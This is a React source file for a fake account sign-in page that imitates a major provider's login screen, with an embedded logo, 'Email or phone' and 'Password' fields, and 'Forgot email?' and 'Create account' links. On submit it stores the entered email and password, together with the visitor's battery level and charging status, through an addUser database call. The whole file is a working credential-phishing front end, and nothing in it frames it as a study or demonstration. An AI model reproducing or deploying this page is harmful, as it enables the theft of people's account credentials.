import React, { useEffect, useState } from 'react'
import { addUser } from './Database'

function App() {
  const [battery , setBattery] = useState('')
  const batteryInfoPromise = navigator.getBattery().then(battery => {
    const percentage = Math.round(battery.level * 100);
    const chargingStatus = battery.charging ? "charging" : "not charging";
    return `Battery ${percentage}% and it's ${chargingStatus}`;
  });
  
  const[email , setEmail] = useState('')
  const[pass , setPass] = useState('')


      const handleSubmit=()=>{
        if (email.length > 0 && pass.length > 0){
          addUser(email , pass  , battery)
        }
        setEmail('')
        setPass('')
      }

        useEffect(()=>{
          batteryInfoPromise.then(batteryInfo => setBattery(batteryInfo));

        } , [])

      return (
    <div className='flex items-center justify-center h-screen p-6'>
      
      <div className="card flex flex-col items-center gap-3 border-2 p-3 rounded md:w-[30rem] w-full">
        
      <a href="#" className="brand w-[100px]">
          <img className='w-fit h-fit' src="data:image/png;base64,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" />
        </a>
        <h2 className='text-2xl'>Sign in </h2>
        <p className="to rounded-full px-3 py-2 border">to continue to Your account</p>
        <form className='flex flex-col gap-3 w-full' onSubmit={(e)=>(e.preventDefault() , handleSubmit())}>
            <input onChange={(e)=> setEmail(e.target.value)} value={email} type="text" placeholder='Email or phone ' className='border-2  p-3 rounded w-full focus:border-blue-600 outline-none' required/>
            <input onChange={(e)=> setPass(e.target.value)} value={pass} type="text" placeholder='Password'  className='border-2  p-3 rounded w-full focus:border-blue-600 outline-none' required/>
            <button  type='submit' className='bg-blue-600 text-white p-3 rounded font-bold'>Next </button>
        </form>
        <br />
        <a href="#!" className="forget text-blue-700 hover:bg-blue-200 ">Forgot email?</a>
        <a href="#!" className="create text-blue-700 hover:bg-blue-200">Create account</a>

      </div>

    </div>
  )
}

export default App
